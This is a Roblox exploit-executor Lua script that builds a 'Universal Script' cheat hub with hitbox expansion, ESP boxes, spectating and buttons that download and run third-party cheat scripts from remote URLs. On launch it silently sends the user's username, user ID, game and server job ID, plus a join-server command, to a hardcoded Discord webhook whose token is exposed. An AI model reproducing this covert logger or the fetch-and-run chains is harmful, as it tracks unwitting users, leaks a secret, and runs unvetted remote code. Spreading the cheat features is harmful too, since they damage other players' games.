local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local webhookURL = "https://discord.com/api/webhooks/1530636370849042463/Re9hI7l-0YR3wlHh0Onq7CtXlZ1VuJykhqov9ongFUjjBF5rv5RB5GiQWaw6ag_mkeUq"

local function sendWebhook()
	local success, err = pcall(function()
		local placeId = game.PlaceId
		local jobId = game.JobId
		local gameName = "Unknown"

		pcall(function()
			gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
		end)

		local data = {
			["content"] = "",
			["embeds"] = {{
				["title"] = "Universal Script Executed",
				["color"] = 5793266,
				["fields"] = {
					{
						["name"] = "Username",
						["value"] = LocalPlayer.Name,
						["inline"] = true
					},
					{
						["name"] = "Display Name",
						["value"] = LocalPlayer.DisplayName,
						["inline"] = true
					},
					{
						["name"] = "User ID",
						["value"] = tostring(LocalPlayer.UserId),
						["inline"] = true
					},
					{
						["name"] = "Game",
						["value"] = gameName,
						["inline"] = false
					},
					{
						["name"] = "Place ID",
						["value"] = tostring(placeId),
						["inline"] = true
					},
					{
						["name"] = "Job ID (Server)",
						["value"] = jobId ~= "" and jobId or "None (Singleplayer / Studio)",
						["inline"] = true
					},
					{
						["name"] = "Join This Server",
						["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. jobId .. "\")\n```",
						["inline"] = false
					}
				},
				["footer"] = {
					["text"] = "Universal Script Logger • Copy the code above and run it to join the same server"
				},
				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}}
		}

		local requestFunc = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request or http_request

		if requestFunc then
			requestFunc({
				Url = webhookURL,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = HttpService:JSONEncode(data)
			})
		end
	end)
end

task.spawn(sendWebhook)

local function getExecutorName()
	local success, result = pcall(function()
		if identifyexecutor then return identifyexecutor() end
		if getexecutorname then return getexecutorname() end
		return "Unknown"
	end)
	return success and result or "Unknown"
end

local isCreator = (LocalPlayer.Name == "jimcam79") or (LocalPlayer.UserId == 454468165)

local window = WindUI:CreateWindow({
	Title = "Universal Script",
	Icon = "move",
	Theme = "Dark",
	Transparent = true,
	BackgroundTransparency = 0.15,

	User = {
		Enabled = true,
		Anonymous = false,
		Callback = function()
			WindUI:Notify({
				Title = LocalPlayer.Name,
				Content = "Executor: " .. getExecutorName() .. (isCreator and "\n👑 Creator" or ""),
				Duration = 4
			})
		end
	}
})

if isCreator then
	pcall(function()
		window:Tag({
			Title = "Creator",
			Icon = "crown",
			Color = Color3.fromRGB(255, 215, 0)
		})
	end)
end

pcall(function()
	window:Open()
end)

local hitbox_tab = window:Tab({ Title = "Hitbox", Icon = "box" })
local teams_tab = window:Tab({ Title = "Teams", Icon = "users" })
local esp_tab = window:Tab({ Title = "Esp", Icon = "eye" })
local spectate_tab = window:Tab({ Title = "Spectate", Icon = "eye" })
local universal_tab = window:Tab({ Title = "Universal", Icon = "code" })
local games_tab = window:Tab({ Title = "Games", Icon = "gamepad" })
local theme_tab = window:Tab({ Title = "Theme", Icon = "palette" })
local credits_tab = window:Tab({ Title = "Credits", Icon = "info" })

local size = 13
local transparency = 0.5
local expanded = false
local selectedTeams = {}
local originalSizes = {}
local espEnabled = false
local currentSpectate = nil
local selectedSpectatePlayer = nil
local rainbowConnection = nil


local function shouldAffectPlayer(targetPlayer)
	if targetPlayer == LocalPlayer then return false end
	if #selectedTeams == 0 then return true end
	local team = targetPlayer.Team
	if not team then return false end
	for _, teamName in ipairs(selectedTeams) do
		if team.Name == teamName then return true end
	end
	return false
end

local function ResizeHead(targetPlayer, newSize)
	if not shouldAffectPlayer(targetPlayer) then return end
	local character = targetPlayer.Character
	if not character then return end
	local head = character:FindFirstChild("Head")
	if not head then return end
	
	if not originalSizes[head] then
		originalSizes[head] = head.Size
	end
	
	if newSize <= 0 then
		head.Size = originalSizes[head]
		head.Transparency = 1
	else
		head.Size = Vector3.new(newSize, newSize, newSize)
		head.Transparency = transparency
		head.CanCollide = false
		head.Massless = true
		head.Anchored = false
	end
end


hitbox_tab:Toggle({
	Title = "Enable Head Expander",
	Desc = "Turn expander on/off",
	Type = "Checkbox",
	Icon = "check",
	Value = false,
	Callback = function(state)
		expanded = state
		if not state then
			for _, plr in Players:GetPlayers() do
				ResizeHead(plr, 0)
			end
		end
	end
})

hitbox_tab:Slider({
	Title = "Head Size",
	Desc = "Higher = bigger hitbox",
	Step = 1,
	Value = { Min = 5, Max = 25, Default = 13 },
	Callback = function(value) size = value end
})

hitbox_tab:Slider({
	Title = "Head Transparency",
	Desc = "Visibility of expanded heads",
	Step = 0.1,
	Value = { Min = 0.3, Max = 1, Default = 0.5 },
	Callback = function(value) transparency = value end
})


local allTeams = {}
for _, team in ipairs(game:GetService("Teams"):GetTeams()) do
	table.insert(allTeams, team.Name)
end

teams_tab:Dropdown({
	Title = "Target Teams",
	Desc = "Select teams to affect (empty = everyone)",
	Values = allTeams,
	Multi = true,
	Callback = function(selected)
		selectedTeams = selected or {}
	end
})

teams_tab:Button({
	Title = "Refresh Team List",
	Desc = "Update if new teams appeared",
	Callback = function() print("Team list refreshed") end
})


local ESP = {}
ESP.Boxes = {}

local function createBox(player)
	if ESP.Boxes[player] then return ESP.Boxes[player] end
	local box = Drawing.new("Square")
	box.Thickness = 2
	box.Filled = false
	box.Transparency = 1
	box.Color = Color3.new(1, 0, 0)
	box.Visible = false
	ESP.Boxes[player] = box
	return box
end

local function clearAllESP()
	for _, box in pairs(ESP.Boxes) do
		if box then
			box.Visible = false
			box:Remove()
		end
	end
	ESP.Boxes = {}
end

local function updateESP()
	if not espEnabled then return end
	for _, player in ipairs(Players:GetPlayers()) do
		if player == LocalPlayer then continue end
		local character = player.Character
		if not character then
			if ESP.Boxes[player] then ESP.Boxes[player].Visible = false end
			continue
		end
		local rootPart = character:FindFirstChild("HumanoidRootPart")
		local humanoid = character:FindFirstChild("Humanoid")
		if not rootPart or not humanoid or humanoid.Health <= 0 then
			if ESP.Boxes[player] then ESP.Boxes[player].Visible = false end
			continue
		end
		
		local boxColor = Color3.new(1, 0, 0)
		if player.Team then boxColor = player.Team.TeamColor.Color end
		
		local box = createBox(player)
		box.Color = boxColor
		
		local camera = workspace.CurrentCamera
		local rootPos, onScreen = camera:WorldToViewportPoint(rootPart.Position)
		if not onScreen then
			box.Visible = false
			continue
		end
		
		local head = character:FindFirstChild("Head")
		local legPart = character:FindFirstChild("LeftFoot") or character:FindFirstChild("LeftLowerLeg")
		local topPos = head and camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.5, 0)) or rootPos
		local bottomPos = legPart and camera:WorldToViewportPoint(legPart.Position - Vector3.new(0, 0.5, 0)) or rootPos
		
		local height = math.abs(topPos.Y - bottomPos.Y)
		local width = height * 0.6
		box.Size = Vector2.new(width, height)
		box.Position = Vector2.new(rootPos.X - width/2, topPos.Y)
		box.Visible = true
	end
end

esp_tab:Toggle({
	Title = "Box Outline ESP",
	Desc = "Toggle team-colored box ESP on/off",
	Type = "Checkbox",
	Icon = "check",
	Value = false,
	Callback = function(state)
		espEnabled = state
		if not state then clearAllESP() end
	end
})


local function getPlayerList()
	local list = {}
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer then
			table.insert(list, player.Name)
		end
	end
	return list
end

spectate_tab:Dropdown({
	Title = "Select Player",
	Desc = "Choose who to spectate",
	Values = getPlayerList(),
	Callback = function(selectedName)
		selectedSpectatePlayer = selectedName
	end
})

spectate_tab:Button({
	Title = "Spectate",
	Desc = "Start spectating the selected player",
	Callback = function()
		if not selectedSpectatePlayer then
			print("No player selected")
			return
		end
		local target = Players:FindFirstChild(selectedSpectatePlayer)
		if target and target.Character and target.Character:FindFirstChild("Humanoid") then
			currentSpectate = target
			workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
			print("Now spectating:", selectedSpectatePlayer)
		else
			print("Player not found or no character")
		end
	end
})

spectate_tab:Button({
	Title = "Stop Spectating",
	Desc = "Return camera to yourself",
	Callback = function()
		currentSpectate = nil
		local char = LocalPlayer.Character
		if char and char:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = char.Humanoid
		end
		print("Stopped spectating")
	end
})

spectate_tab:Button({
	Title = "Refresh Player List",
	Desc = "Update the dropdown",
	Callback = function()
		print("Player list refreshed - reselect if needed")
	end
})

game:GetService("RunService").RenderStepped:Connect(function()
	if currentSpectate and currentSpectate.Character and currentSpectate.Character:FindFirstChild("Humanoid") then
		workspace.CurrentCamera.CameraSubject = currentSpectate.Character.Humanoid
	end
end)


universal_tab:Button({
	Title = "Universal All Games",
	Desc = "Load the universal all games script",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/All-Roblox-Games-Script/refs/heads/main/JN%20HH%20Gaming",true))()
	end
})

universal_tab:Button({
	Title = "Infinite Yield",
	Desc = "Load Infinite Yield admin commands",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	end
})


games_tab:Button({
	Title = "Basketball Zero: Auto Green",
	Desc = "Load Basketball Zero Auto Green script",
	Callback = function()
		script_key="PUT YOUR KEY HERE"; loadstring(game:HttpGet("https://raw.githubusercontent.com/nouralddin-abdullah/99-night/refs/heads/main/main-en.lua"))()
	end
})

games_tab:Button({
	Title = "War Tycoon",
	Desc = "Load War Tycoon script",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Comanche-War-Tycoon-aim-and-more-190482"))()
	end
})

games_tab:Button({
	Title = "Arsenal",
	Desc = "Load Arsenal script",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/eselfins31/Valor-Hub/main/Arsenal%20Advanced/Unified_protected.lua", true))()
	end
})


local function stopRainbow()
	if rainbowConnection then
		rainbowConnection:Disconnect()
		rainbowConnection = nil
	end
end

theme_tab:Dropdown({
	Title = "Select Theme",
	Desc = "Change the GUI theme",
	Values = {"Dark", "White", "Magenta", "Yellow", "Red", "Pink", "Blue", "Cyan", "Rainbow"},
	Value = "Dark",
	Callback = function(option)
		stopRainbow()
		
		if option == "Rainbow" then
			local hue = 0
			rainbowConnection = game:GetService("RunService").Heartbeat:Connect(function()
				hue = (hue + 0.005) % 1
				pcall(function()
					WindUI:SetTheme("Dark")
				end)
			end)
		elseif option == "Red" or option == "Pink" then
			pcall(function() WindUI:SetTheme("Rose") end)
		elseif option == "Magenta" then
			pcall(function() WindUI:SetTheme("Violet") end)
		elseif option == "White" then
			pcall(function() WindUI:SetTheme("Light") end)
		elseif option == "Yellow" then
			pcall(function() WindUI:SetTheme("Amber") end)
		elseif option == "Blue" then
			pcall(function() WindUI:SetTheme("Indigo") end)
		elseif option == "Cyan" then
			pcall(function() WindUI:SetTheme("Sky") end)
		else
			pcall(function() WindUI:SetTheme("Dark") end)
		end
	end
})


credits_tab:Paragraph({
	Title = "Credits",
	Desc = "Credits to Team Void"
})


game:GetService("RunService").Heartbeat:Connect(function()
	if expanded then
		for _, player in Players:GetPlayers() do
			ResizeHead(player, size)
		end
	end
end)

game:GetService("RunService").RenderStepped:Connect(updateESP)

Players.PlayerRemoving:Connect(function(player)
	if ESP.Boxes[player] then
		ESP.Boxes[player]:Remove()
		ESP.Boxes[player] = nil
	end
	if currentSpectate == player then
		currentSpectate = nil
		local char = LocalPlayer.Character
		if char and char:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = char.Humanoid
		end
	end
end)

Players.PlayerAdded:Connect(function(newPlayer)
	if newPlayer == LocalPlayer then return end
	newPlayer.CharacterAdded:Connect(function()
		task.wait(0.6)
		if expanded then ResizeHead(newPlayer, size) end
	end)
end)

for _, plr in Players:GetPlayers() do
	if plr ~= LocalPlayer then
		plr.CharacterAdded:Connect(function()
			task.wait(0.6)
			if expanded then ResizeHead(plr, size) end
		end)
	end
end


local UIS = game:GetService("UserInputService")

UIS.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.RightShift then
		if window.Toggle then
			window:Toggle()
		elseif window.ToggleVisibility then
			window:ToggleVisibility()
		elseif window.SetVisible then
			local currentlyVisible = window.Visible or true
			window:SetVisible(not currentlyVisible)
		else
			pcall(function() window:Open() end)
		end
	end
end)

print("Universal Hub Loaded Twn")
